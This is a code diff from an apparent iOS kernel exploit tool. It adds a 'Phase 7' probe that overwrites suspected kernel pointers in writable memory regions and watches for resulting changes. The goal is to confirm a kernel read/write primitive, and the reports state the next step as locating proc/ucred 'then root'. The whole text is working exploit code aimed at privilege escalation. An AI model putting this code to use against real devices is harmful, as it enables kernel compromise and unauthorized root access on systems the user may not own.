@@ -313,6 +313,85 @@ static BOOL isKernelPointer(uint64_t v) {
         }
     }
 
+    // --- Phase 7: output diff test (kirby technique) ---
+    // Modify kernel pointers in writable regions, scan for changes in other fields.
+    // If output diffs appear: kernel reads our data => kread64/kwrite CONFIRMED.
+    [report appendString:@"\n--- Phase 7: output diff test (kirby) ---\n"];
+
+    scanAddr = 0; scanSize = 0;
+    int totalDiffs = 0;
+    int kptrsModified = 0;
+
+    while (1) {
+        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
+        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+        uint32_t d4 = 0;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d4,
+                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
+        if (scanInfo.is_submap) continue;
+        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+        if (scanSize > 16 * 1024 * 1024) continue;
+
+        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
+        size_t words = scanSize / 8;
+
+        // Snapshot original values
+        uint64_t *orig = malloc(scanSize);
+        if (!orig) continue;
+        memcpy(orig, (void *)scanAddr, scanSize);
+
+        // Find first real kernel pointer (skip 0xffffffffffffffff etc.)
+        int modified = 0;
+        for (size_t i = 0; i < words && modified < 3; i++) {
+            uint64_t v = rp[i];
+            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
+            if ((v & 0xfff) == 0xfff) continue; // skip all-ones patterns
+
+            // Modify by +0x100
+            rp[i] = v + 0x100;
+            kptrsModified++;
+            modified++;
+
+            // Wait briefly for kernel to react
+            usleep(1000);
+
+            // Scan for output diffs
+            for (size_t j = 0; j < words; j++) {
+                if (j == i) continue; // skip the one we modified
+                uint64_t now = rp[j];
+                uint64_t was = orig[j];
+                if (now != was) {
+                    totalDiffs++;
+                    [report appendFormat:@"DIFF: region+0x%zx: 0x%llx -> 0x%llx (after modifying +0x%zx)\n",
+                     j * 8, was, now, i * 8];
+                    [report appendFormat:@"  kptr modified: 0x%llx -> 0x%llx\n", v, v + 0x100];
+                    if (totalDiffs >= 5) break;
+                }
+            }
+            if (totalDiffs >= 5) break;
+
+            // Restore
+            rp[i] = v;
+            usleep(500);
+        }
+
+        free(orig);
+        if (totalDiffs >= 5) break;
+    }
+
+    [report appendFormat:@"kptrs modified: %d, output diffs found: %d\n", kptrsModified, totalDiffs];
+
+    if (totalDiffs > 0) {
+        [report appendString:@"*** KREAD64 + KWRITE CONFIRMED (kirby technique) ***\n"];
+        [report appendString:@"Kernel reads our modified data and updates other fields.\n"];
+        [report appendString:@"=> Full KRW primitive available.\n"];
+        [report appendString:@"Next: locate proc/ucred via output diffs, then root.\n"];
+    } else {
+        [report appendString:@"No output diffs detected.\n"];
+        [report appendString:@"Kernel may not read these regions directly.\n"];
+        [report appendString:@"Try: modify kptrs in different regions, or use translate_receive bit-set.\n"];
+    }
+
     // --- Verdict ---
     [report appendString:@"\n"];
     if (kptrCount > 0) {
